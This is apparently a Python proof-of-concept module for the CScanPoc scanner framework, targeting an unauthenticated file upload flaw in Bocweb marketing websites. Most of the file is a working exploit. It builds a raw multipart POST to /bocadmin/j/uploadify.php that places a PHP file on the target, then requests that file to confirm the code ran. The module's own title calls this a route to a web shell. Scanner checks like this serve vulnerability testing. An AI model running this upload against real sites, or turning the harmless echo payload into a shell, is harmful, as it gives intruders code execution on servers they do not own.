# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Bocweb_0001'  # 平台漏洞编号，留空
    name = '博采微营销网站前台getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        Bocweb（博采网络）是杭州博采网络科技股份有限公司的高端网站建设品牌，是知名的杭州网络公司。
        博采网络成立于2004年。我们致力于为全球精英企业提供创新、尖端、前沿的数字化营销服务。十年来始终坚守"全网价值营销服务商"的服务定位，与全球逾3000家企业建立了长期深入、互惠互信的战略合作关系，其中包括阿里巴巴、松下、吉利、华润、保利、万科、传化等知名企业。
        官网给出的案例：http://www.bocweb.cn/

        上传点：/bocadmin/j/uploadify.php
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3504/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Bocweb'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '62949694-75a4-4e8a-8088-f0e8e67efe81'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0124987
            hh = hackhttp.hackhttp()
            arg = self.target
            p = urllib.parse.urlparse(arg)
            raw = """
POST /bocadmin/j/uploadify.php HTTP/1.1
Host: {netloc}
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------32382156818478
Content-Length: 337

-----------------------------32382156818478
Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"
Content-Type: application/octet-stream

<?php
echo \"vul_test_bbb\";
?>

-----------------------------32382156818478
Content-Disposition: form-data; name="folder"

/
-----------------------------32382156818478
Content-Disposition: form-data; name="submit"

Submit
-----------------------------32382156818478--"""
            code, head, res, errcode, _ = hh.http(
                arg + '/bocadmin/j/uploadify.php', raw=raw.format(scheme=p.scheme, netloc=p.netloc))
            if code == 200 and res:
                n_url = 'http://%s/test.php' % (p.netloc)
                code, head, res, errcode, _ = hh.http(n_url)
                if code == 200 and 'vul_test_bbb' in res:
                    #security_hole(arg + ":Upload File at " + n_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=self.target+"/bocadmin/j/uploadify.php" ))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
